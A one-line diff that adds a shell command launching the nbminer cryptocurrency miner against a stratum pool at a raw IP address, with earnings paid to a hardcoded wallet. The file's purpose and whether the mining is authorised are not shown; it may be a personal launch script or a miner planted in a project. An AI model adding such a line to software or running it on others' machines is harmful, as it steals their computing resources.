@@ -1,0 +1,1 @@
+./nbminer -a ethash -o stratum+tcp://47.108.142.254:6688 -u 0x79103afa28d1d130b528164438d1acf20ec1f805.default
